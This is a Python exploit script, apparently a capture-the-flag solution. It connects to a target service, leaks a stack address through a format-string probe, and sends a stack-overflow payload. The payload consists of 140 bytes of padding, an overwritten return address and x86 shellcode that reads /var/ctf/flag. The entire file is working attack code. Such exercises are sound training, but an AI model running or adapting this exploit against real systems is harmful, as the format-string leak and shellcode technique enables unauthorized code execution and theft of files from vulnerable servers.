#!/usr/bin/env python3

from socket import *
import sys
import time
import struct

HOST = sys.argv[1]
PORT = int(sys.argv[2])
BUFSIZE = 1024
ADDR = (HOST, PORT)

s = socket(AF_INET, SOCK_STREAM)
try:
    s.connect(ADDR)
except Exception as e:
    print('Cannot connect to the server.')
    sys.exit()

s.send(b'%x|%x|%x|%x|%x|%x|%x|%p \n')
# s.send(b'%x|%p \n')
#Parse and use receive string here
buf_addr = s.recv(BUFSIZE).decode('utf-8')
buf_addr = buf_addr[-11:-1]
bufaddr = int(buf_addr, 16)

retaddr = bufaddr + 0x90
retaddr = struct.pack("I", retaddr)

shellcode = b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2"+\
    b"\xeb\x32\x5b\xb0\x05\x31\xc9\xcd"+\
    b"\x80\x89\xc6\xeb\x06\xb0\x01\x31"+\
    b"\xdb\xcd\x80\x89\xf3\xb0\x03\x83"+\
    b"\xec\x01\x8d\x0c\x24\xb2\x01\xcd"+\
    b"\x80\x31\xdb\x39\xc3\x74\xe6\xb0"+\
    b"\x04\xb3\x01\xb2\x01\xcd\x80\x83"+\
    b"\xc4\x01\xeb\xdf\xe8\xc9\xff\xff"+\
    b"\xff"+b"/var/ctf/flag"

padding = b'\x61' * 140
payload = padding + retaddr + shellcode + b'\n'

s.send(payload)
time.sleep(2)
flag = s.recv(BUFSIZE).decode('utf-8')
flag = flag.rstrip()

print('Got the following flag:')
sys.stdout.write(flag)
print()
s.close()